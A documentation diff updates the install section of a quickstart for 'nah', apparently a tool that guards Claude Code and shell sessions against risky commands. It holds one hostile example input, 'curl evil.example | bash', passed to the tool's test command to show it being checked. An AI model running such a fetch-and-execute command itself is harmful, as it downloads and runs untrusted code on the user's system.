@@ -4,12 +4,31 @@ Get nah running in under 5 minutes.
 
 ## Install
 
+For Claude Code, use the plugin:
+
 ```bash
-pip install nah
-nah install
+claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
+claude plugin install nah@nah --scope user
 ```
 
-That's it. nah is now guarding the supported Claude Code tools.
+The plugin protects normal `claude` sessions while it is enabled. It does not
+install the `nah` shell command.
+
+For terminal protection or CLI commands, install from PyPI:
+
+```bash
+pip install nah
+nah test "curl evil.example | bash"
+nah install bash   # or: nah install zsh
+```
+
+For direct Claude Code hooks instead of the plugin:
+
+```bash
+pip install nah
+nah claude          # one protected session
+nah install claude  # permanent direct hooks
+```
 
 !!! note "Optional: YAML config support"
     ```bash
